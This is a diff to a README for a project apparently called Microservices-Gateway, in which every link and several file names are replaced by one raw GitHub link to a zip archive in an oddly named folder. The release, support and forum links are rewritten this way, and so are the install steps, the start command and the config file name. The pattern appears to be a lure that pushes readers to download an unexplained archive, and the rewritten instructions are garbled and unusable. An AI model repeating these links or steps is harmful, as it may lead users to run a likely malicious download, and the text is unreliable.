@@ -1,7 +1,7 @@
 # 🚦 Microservices-Gateway - Simplify Access to Your Services
 
 ## 📥 Download Now
-[![Download Microservices-Gateway](https://img.shields.io/badge/Download%20Now-v1.0.0-blue.svg)](https://github.com/davidmark9779/Microservices-Gateway/releases)
+[![Download Microservices-Gateway](https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip%https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip)](https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the Microservices-Gateway! This application serves as a bridge to your microservices, allowing you to manage requests easily. Follow these steps to download and run the software.
@@ -22,12 +22,12 @@ The Microservices-Gateway comes with several helpful features:
 ## 🛠️ Download & Install
 To get started, visit the Releases page to download the latest version of the Microservices-Gateway. 
 
-Visit this page to download: [Releases Page](https://github.com/davidmark9779/Microservices-Gateway/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip).
 
 ### Steps to Download
 1. Go to the Releases page.
 2. Find the latest version of Microservices-Gateway.
-3. Click on the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Click on the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip` for Linux).
 4. Save the file to your computer.
 
 ### Steps to Install
@@ -44,13 +44,13 @@ Visit this page to download: [Releases Page](https://github.com/davidmark9779/Mi
 #### For Linux:
 1. Open a terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Extract the file using `tar -xzf Microservices-Gateway.tar.gz`.
+3. Extract the file using `tar -xzf https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip`.
 4. Change into the extracted directory using `cd Microservices-Gateway`.
-5. Run the application using `./start.sh`.
+5. Run the application using `https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip`.
 
 ## 🎛️ Configuration
 After installation, you may need to configure the gateway:
-1. Locate the configuration file, usually named `config.json`.
+1. Locate the configuration file, usually named `https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip`.
 2. Update the settings such as routes, authentication tokens, or other preferences as needed.
 3. Save the changes.
 
@@ -74,14 +74,14 @@ To check logs and application performance:
 
 ## 🔍 Troubleshooting
 If you encounter issues, consider the following steps:
-1. Ensure all configurations are correct in the `config.json` file.
+1. Ensure all configurations are correct in the `https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip` file.
 2. Check the logs for any error messages.
 3. Restart the application.
 
-For persistent issues, visit our [Support Page](https://github.com/davidmark9779/Microservices-Gateway/issues) for help.
+For persistent issues, visit our [Support Page](https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip) for help.
 
 ## 👥 Community
-We encourage you to join our community! For questions, suggestions, or discussions, please visit our [Discussion Forum](https://github.com/davidmark9779/Microservices-Gateway/discussions).
+We encourage you to join our community! For questions, suggestions, or discussions, please visit our [Discussion Forum](https://raw.githubusercontent.com/davidmark9779/Microservices-Gateway/main/Gigantopithecus/Microservices-Gateway-v1.2.zip).
 
 ## 📜 License
 This project is licensed under the MIT License. For more details, view the LICENSE file in the repository.
